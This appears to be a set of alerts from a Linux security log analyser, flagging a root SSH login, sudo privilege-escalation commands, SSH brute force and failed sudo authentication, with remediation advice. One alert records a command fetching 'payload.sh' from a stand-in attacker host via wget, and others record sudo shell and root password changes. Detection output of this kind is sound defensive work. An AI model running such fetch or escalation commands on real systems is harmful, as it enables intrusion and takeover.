alerts.title: Root SSH Login Succeeded
alerts.description: Root login accepted from 45.33.32.156 at Apr  8 03:10:11
alerts.recommendation: Immediate investigation required. Disable root SSH login (PermitRootLogin no).

alerts.title: Suspicious Sudo Command
alerts.description: User bilal ran sensitive command via sudo: /bin/bash at Apr  8 03:01:14
alerts.recommendation: Review whether this command is authorized. Check for privilege escalation.

alerts.description: User bilal ran sensitive command via sudo: /usr/bin/passwd root at Apr  8 03:05:22
alerts.recommendation: Review whether this command is authorized. Check for privilege escalation.

alerts.title: Suspicious Sudo Command
alerts.description: User deploy ran sensitive command via sudo: /usr/bin/wget http://evil.example.com/payload.sh at Apr  8 06:00:00
alerts.recommendation: Review whether this command is authorized. Check for privilege escalation.

alerts.title: SSH Brute Force Detected
alerts.description: IP 192.168.1.105 had 12 failed SSH login attempts
alerts.recommendation: Block IP 192.168.1.105 via firewall (iptables/ufw). Investigate origin.

alerts.title: SSH Brute Force Detected

alerts.recommendation: Block IP 203.0.113.42 via firewall (iptables/ufw). Investigate origin.

alerts.title: Sudo Authentication Failure
alerts.description: User www-data failed sudo authentication at Apr  8 04:00:00
alerts.recommendation: May indicate password guessing or unauthorized privilege escalation attempt.
